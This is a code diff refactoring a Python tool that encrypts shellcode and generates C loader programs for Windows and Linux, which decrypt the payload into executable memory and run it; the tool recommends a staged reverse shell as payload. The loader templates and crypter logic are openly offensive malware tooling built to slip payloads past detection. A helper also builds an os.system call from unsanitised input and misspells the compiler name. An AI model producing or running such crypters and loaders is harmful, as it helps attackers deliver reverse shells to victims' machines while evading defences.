@@ -2,198 +2,203 @@ import nacl.secret
 import nacl.utils
 from nacl.pwhash import argon2id
 from pathlib import Path
-import parser
+import cryptonite_parser
 import os
-import base64
-from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
-from cryptography.hazmat.backends import default_backend
-from cryptography.hazmat.primitives import hashes
-import nacl.secret
-import nacl.utils
+
 
 def read_file(filename: str) -> bytes:
+    """Read and return file content as bytes."""
     with open(filename, "rb") as file:
         return file.read()
 
+
 def yes_no(prompt: str) -> bool:
+    """Prompt user for a yes/no input."""
     while True:
         answer = input(f"{prompt} (y/n): ").strip().lower()
-        if answer == 'y':
-            return True
-        elif answer == 'n':
-            return False
-        else:
-            print("Please enter 'y' or 'n'.")
-            
-def generate_key(ask_save_bool=False) -> bytes:
-    key = nacl.utils.random(nacl.secret.SecretBox.KEY_SIZE)  # 32-byte key
+        if answer in ['y', 'n']:
+            return answer == 'y'
+        print("Please enter 'y' or 'n'.")
+
+
+def generate_key(ask_save: bool = False) -> bytes:
+    """Generate a new key and optionally save it."""
+    key = nacl.utils.random(nacl.secret.SecretBox.KEY_SIZE)
     print(f"Generated key (hex): {key.hex()}")
-    if ask_save_bool: ask_save(key.hex())  # Saving as hex for ease
+    if ask_save:
+        save_data_to_file(key.hex(), prompt="Save key to file?")
     return key
 
-def write_to_file(filename: str, data: str, mode = "a"):
-    with open(filename, mode) as file:
+
+def write_to_file(filename: str, data: str, mode: str = "a") -> None:
+    """Write data to a file."""
+    with open(filename, mode, encoding="utf-8") as file:
         file.write(data)
 
-def ask_overwrite(filename: str) -> bool:
-    if Path(filename).exists():
-        return yes_no(f"{filename} exists. Overwrite?")
-    return True
 
-def ask_save(data: str) -> None:
-    if yes_no("Save to file?"):
+def ask_overwrite(filename: str) -> bool:
+    """Ask the user whether to overwrite an existing file."""
+    return not Path(filename).exists() or yes_no(f"{filename} exists. Overwrite?")
+
+
+def save_data_to_file(data: str, prompt: str = "Save to file?") -> None:
+    """Ask the user whether to save data to a file and handle overwriting."""
+    if yes_no(prompt):
         filename = input("Filename: ")
         if ask_overwrite(filename):
             write_to_file(filename, data, "w")
 
-def encrypt_file(filename="", key="") -> bytes:
-    if not key:
-        if yes_no("Do you want to generate a key?"):
-            key = generate_key()
-        else:
-            key = ask_key()
-    
-    while True:
-        if not filename:
-            filename = input("Filename: ")
-        else:
-            break
-        if Path(filename).exists():
-            break 
-        print("File not found. Try again.")
-        filename = ""
-    
-    with open(filename, "rb") as file:
-        file_data = file.read()
-    
-    encrypted_file_data = encrypt_data(file_data, key)
-    
-    with open(f"{filename}.encrypted", "wb") as enc_file:
-        enc_file.write(encrypted_file_data)
-    print(f"Written to {filename}.encrypted\n")
 
+def encrypt_file(filename: str = "", key: bytes = None) -> bytes:
+    """Encrypt a file and save the result."""
+    key = key or (generate_key() if yes_no("Generate a key?") else ask_key())
+    
+    filename = filename or input("Filename: ")
+    while not Path(filename).exists():
+        print("File not found. Try again.")
+        filename = input("Filename: ")
+
+    file_data = read_file(filename)
+    encrypted_file_data = encrypt_data(file_data, key)
+
+    encrypted_filename = f"{filename}.encrypted"
+    with open(encrypted_filename, "wb") as enc_file:
+        enc_file.write(encrypted_file_data)
+
+    print(f"Encrypted file saved as {encrypted_filename}\n")
     return encrypted_file_data
 
-def bytes_to_c_array(data: bytes) -> str:
-    c_array = ', '.join(f'0x{b:02x}' for b in data)
-    return c_array
 
-    
+def bytes_to_c_array(data: bytes) -> str:
+    """Convert bytes to C-style array string."""
+    return ', '.join(f'0x{b:02x}' for b in data)
+
 
 def ask_key() -> bytes:
-    if yes_no("Generate key?"):
+    """Ask the user for a key, either by generating or loading it."""
+    if yes_no("Generate a key?"):
         return generate_key()
+
     if yes_no("Load key from file?"):
-        while True:
-            filename = input("Filename: ")
-            if not Path(filename).exists():
-                print("File doesn't exist.")
-            else:
-                key_hex = read_file(filename)
-                try:
-                    return bytes.fromhex(key_hex)
-                except ValueError:
-                    print("Invalid key format.")
-                    break
-    else:
-        key_hex = input("Key (hex): ")
-        while not valid_hex(key_hex):
-            key_hex = input("Key (hex): ")
-        return bytes.fromhex(key_hex)
+        filename = input("Filename: ")
+        if not Path(filename).exists():
+            print("File doesn't exist.")
+            return ask_key()
+
+        try:
+            return bytes.fromhex(read_file(filename).decode('utf-8'))
+        except ValueError:
+            print("Invalid key format.")
+            return ask_key()
+
+    key_hex = input("Key (hex): ")
+    while not valid_hex(key_hex):
+        key_hex = input("Invalid hex. Enter key (hex): ")
+    return bytes.fromhex(key_hex)
+
 
 def encrypt_data(data: bytes, key: bytes) -> bytes:
+    """Encrypt data using the given key."""
     box = nacl.secret.SecretBox(key)
-    encrypted = box.encrypt(data)
-    return encrypted
+    return box.encrypt(data)
 
-def decrypt_data(data: bytes, key: bytes, ask_save_bool=False) -> bytes:
+
+def decrypt_data(data: bytes, key: bytes, ask_save: bool = False) -> bytes:
+    """Decrypt data and optionally save the result."""
     box = nacl.secret.SecretBox(key)
     try:
         decrypted = box.decrypt(data)
     except nacl.exceptions.CryptoError:
-        print("Invalid data. Decryption failed.")
+        print("Decryption failed. Invalid data.")
         return None
-    print(f"Output: {decrypted.decode()}")
-    if ask_save_bool: ask_save(decrypted.decode())
+
+    if ask_save:
+        save_data_to_file(decrypted.decode(), prompt="Save decrypted data to file?")
     return decrypted
 
-def encrypt_phrase(phrase="", key="") -> bytes:
-    phrase = phrase.encode("utf-8")
-    if not key:
-        key = ask_key()
 
-    encrypted_data = encrypt_data(phrase, key)
-    print(encrypted_data.hex())
-    
-    if yes_no("Save to file?"):
-        filename = input("Filename: ")
-        write_to_file(f"{filename}.encrypted", encrypted_data.hex(), "w")
+def encrypt_phrase(phrase: str = "", key: bytes = None) -> bytes:
+    """Encrypt a phrase and optionally save the result."""
+    key = key or ask_key()
+    encrypted_data = encrypt_data(phrase.encode("utf-8"), key)
+
+    print(f"Encrypted phrase (hex): {encrypted_data.hex()}")
+    save_data_to_file(encrypted_data.hex(), "Save encrypted phrase to file?")
+
     return encrypted_data
 
-def decrypt_phrase(phrase="", key="", ask_save_bool=False) -> bytes:
+
+def decrypt_phrase(encrypted_data: str = "", key: bytes = None) -> bytes:
+    """Decrypt an encrypted phrase and optionally save the result."""
     key = ask_key()
     encrypted_data = bytes.fromhex(input("Enter encrypted phrase (hex): "))
-    decrypted_data = decrypt_data(encrypted_data, key, ask_save_bool)
-    
-    if yes_no("Save to file?"):
-        filename = input("Filename: ")
-        write_to_file(f"{filename}.decrypted", decrypted_data.decode(), "w")
+    decrypted_data = decrypt_data(encrypted_data, key)
+
+    if decrypted_data and yes_no("Save decrypted phrase to file?"):
+        write_to_file(f"{input('Filename: ')}.decrypted", decrypted_data.decode(), "w")
+
     return decrypted_data
 
-def generate_key_from_password(password="", salt=None, iterations: int = 100000) -> bytes:
-    if not password:
-        password = input("Password: ")
-    if not salt:
-        salt = nacl.utils.random(16)  # Generate random 16-byte salt
-    key = argon2id.kdf(nacl.secret.SecretBox.KEY_SIZE, password.encode(), salt, opslimit=4, memlimit=1024*1024)
-    print(key.hex())
+
+def generate_key_from_password(password: str = "", salt: bytes = None) -> bytes:
+    """Generate a key from a password and salt using Argon2."""
+    password = password or input("Password: ")
+    salt = salt or nacl.utils.random(16)
+
+    key = argon2id.kdf(
+        nacl.secret.SecretBox.KEY_SIZE,
+        password.encode(),
+        salt,
+        opslimit=4,
+        memlimit=1024 * 1024
+    )
+    print(f"Generated key (hex): {key.hex()}")
     return key
 
-from pathlib import Path
 
-def input_file() -> str:
-    while True:
-        filename = input("Filename (binary): ")
-        print(filename)
-        if Path(filename).exists():
-            return filename
-        print("File does not exist.")
-    
-    
-def valid_hex(string: str) -> bool:
+def valid_hex(hex_string: str) -> bool:
+    """Check if a string is a valid hex."""
     try:
-        bytes.fromhex(string)
+        bytes.fromhex(hex_string)
         return True
     except ValueError:
         return False
 
-def generate_salt(length=16):
-    return os.urandom(length)
 
-def generate_key_from_password(password, salt):
-    kdf = PBKDF2HMAC(
-        algorithm=hashes.SHA256(),
-        length=32,
-        salt=salt,
-        iterations=100000,
-        backend=default_backend()
-    )
-    return base64.urlsafe_b64encode(kdf.derive(password.encode()))
-
-def shellcode_c_crypter(shellcode_file="", key=""):
-    print("[!] Recommended payload is staged reverse shell.")
-    if not key:
-        key = generate_key()
+def shellcode_c_crypter(shellcode_filename: str = "", key: bytes = None, output_filename="crypted.c") -> None:
+    """Encrypt shellcode and generate a C template."""
+    print("[!] Recommended payload is staged reverse shell.\n")
+    key = key or generate_key()
     shellcode_filename = input_file()
+
     encrypted_data = encrypt_file(shellcode_filename, key)
     data_c_array = bytes_to_c_array(encrypted_data)
     key_c_array = bytes_to_c_array(key)
-    c_template = create_c_template(data_c_array, key_c_array)
-    write_to_file("shell.c", c_template, "w")
-    print("C code has been written to shell.c")
 
-def create_c_template(encrypted_data_array, key_array, platform=""):
-    template_windows = f"""
+    c_template = create_c_template(data_c_array, key_c_array)
+    write_to_file(output_filename, c_template, "w")
+    
+    print(f"C code has been written to {output_filename}")
+
+
+def create_c_template(encrypted_data_array: str, key_array: str, platform: str = "") -> str:
+    """Generate C code template for executing shellcode."""
+    platform = platform or input("Platform (windows/linux): ").lower()
+    if platform not in ["windows", "linux"]:
+        print("Invalid platform. Defaulting to Windows.")
+        platform = "windows"
+
+    mem_alloc = {
+        "windows": """VirtualAlloc(NULL, sizeof(decrypted), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);""",
+        "linux": """mmap(NULL, sizeof(decrypted), PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);"""
+    }
+
+    mem_free = {
+        "windows": "VirtualFree(exec_mem, 0, MEM_RELEASE);",
+        "linux": "munmap(exec_mem, sizeof(decrypted));"
+    }
+
+    return f"""
 // x86_64-w64-mingw32-gcc shell.c -o shell.exe -lsodium -static
 #include <stdio.h>
 #include <string.h>
@@ -202,121 +207,59 @@ def create_c_template(encrypted_data_array, key_array, platform=""):
 #include <windows.h>
 
 int main() {{
-    // Initialize libsodium
     if (sodium_init() < 0) {{
-        return 1; // Panic
-    }}
-
-    // Define the encrypted data (including nonce and ciphertext)
-    unsigned char encrypted_data[] = {{ {encrypted_data_array} }};
-    unsigned int encrypted_data_len = sizeof(encrypted_data);
-
-    // Key
-    unsigned char key_bytes[] = {{ {key_array} }};
-
-    // Extract nonce from the encrypted data (first 24 bytes)
-    unsigned char nonce[crypto_secretbox_NONCEBYTES];
-    memcpy(nonce, encrypted_data, crypto_secretbox_NONCEBYTES);
-
-    // Prepare to decrypt
-    unsigned char decrypted[encrypted_data_len - crypto_secretbox_MACBYTES]; // MAC size to subtract
-    if (crypto_secretbox_open_easy(decrypted, encrypted_data + crypto_secretbox_NONCEBYTES, 
-                                    encrypted_data_len - crypto_secretbox_NONCEBYTES, nonce, key_bytes) != 0) {{
-        // Decryption failed
-        printf("Decryption failed!\\n");
         return 1;
     }}
 
-    // Allocate executable memory
-    void *exec_mem = VirtualAlloc(NULL, sizeof(decrypted), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    unsigned char encrypted_data[] = {{ {encrypted_data_array} }};
+    unsigned int encrypted_data_len = sizeof(encrypted_data);
+
+    unsigned char key_bytes[] = {{ {key_array} }};
+
+    unsigned char nonce[crypto_secretbox_NONCEBYTES];
+    memcpy(nonce, encrypted_data, crypto_secretbox_NONCEBYTES);
+
+    unsigned char decrypted[encrypted_data_len - crypto_secretbox_MACBYTES];
+    if (crypto_secretbox_open_easy(decrypted, encrypted_data + crypto_secretbox_NONCEBYTES, 
+                                    encrypted_data_len - crypto_secretbox_NONCEBYTES, nonce, key_bytes) != 0) {{
+        return 1;
+    }}
+
+    void *exec_mem = {mem_alloc[platform]}
     if (exec_mem == NULL) {{
-        perror("VirtualAlloc");
         return 1;
     }}
 
-    // Copy decrypted shellcode to executable memory
     memcpy(exec_mem, decrypted, sizeof(decrypted));
+    void (*shellcode)() = (void(*)())exec_mem;
+    shellcode();
 
-    // Execute shellcode
-    void (*shellcode)() = (void(*)())exec_mem; // Cast the memory to a function pointer
-    shellcode(); // Execute the shellcode
-
-    // Clean up
-    VirtualFree(exec_mem, 0, MEM_RELEASE);
-    
+    {mem_free[platform]}
     return 0;
 }}
 """
 
-    template_linux = f"""
-#include <stdio.h>
-#include <string.h>
-#include <stdlib.h>
-#include <sodium.h>
-#include <sys/mman.h>
-
-int main() {{
-    // Initialize libsodium
-    if (sodium_init() < 0) {{
-        return 1; // Panic
-    }}
-
-    // Define the encrypted data (including nonce and ciphertext)
-    unsigned char encrypted_data[] = {{ {encrypted_data_array} }};
-    unsigned int encrypted_data_len = sizeof(encrypted_data);
-
-    // Key
-    unsigned char key_bytes[] = {{ {key_array} }};
-
-    // Extract nonce from the encrypted data (first 24 bytes)
-    unsigned char nonce[crypto_secretbox_NONCEBYTES];
-    memcpy(nonce, encrypted_data, crypto_secretbox_NONCEBYTES);
-
-    // Prepare to decrypt
-    unsigned char decrypted[encrypted_data_len - crypto_secretbox_MACBYTES]; // MAC size to subtract
-    if (crypto_secretbox_open_easy(decrypted, encrypted_data + crypto_secretbox_NONCEBYTES, 
-                                    encrypted_data_len - crypto_secretbox_NONCEBYTES, nonce, key_bytes) != 0) {{
-        // Decryption failed
-        printf("Decryption failed!\\n");
-        return 1;
-    }}
-
-    // Allocate executable memory
-    void *exec_mem = mmap(NULL, sizeof(decrypted), PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
-    if (exec_mem == MAP_FAILED) {{
-        perror("mmap");
-        return 1;
-    }}
-
-    // Copy decrypted shellcode to executable memory
-    memcpy(exec_mem, decrypted, sizeof(decrypted));
-
-    // Execute shellcode
-    void (*shellcode)() = exec_mem; // Cast the memory to a function pointer
-    shellcode(); // Execute the shellcode
-
-    // Clean up
-    munmap(exec_mem, sizeof(decrypted));
-    
-    return 0;
-}}
-"""
-    if not platform:
-        platform = input("Platform (windows/linux): ")
-    if platform == "linux":
-        return template_linux
-    elif platform == "windows":
-        print("x86_64-w64-mingw32-gcc shell.c -o shell.exe -lsodium -static")
-        return template_windows
+def compile_c_to_exe(filename: str, platform: str = "", compiler="", options="", output: str = "out") -> bool:
+    platform = platform.lower()
+    if platform == "windows":
+        compiler = "x86_64-w64-mingw32-gc"
     else:
-        print("Invalid platform. (windows/linux). Defaulting to Windows")
-        print("x86_64-w64-mingw32-gcc shell.c -o shell.exe -lsodium -static")
-        return template_windows
+        compiler = "gcc"
+    os.system(f"{compiler} {filename} -o {output}{'.exe' if platform == 'windows' else ''} {options}")
+
+def input_file() -> str:
+    """Prompt user for a filename and check if it exists."""
+    while True:
+        filename = input("Filename (binary): ")
+        if Path(filename).exists():
+            return filename
+        print("File does not exist.")
 
 
+def main() -> None:
+    """Main function."""
+    cryptonite_parser.main()
 
-def main():
-    parser.main()
 
 if __name__ == "__main__":
     main()
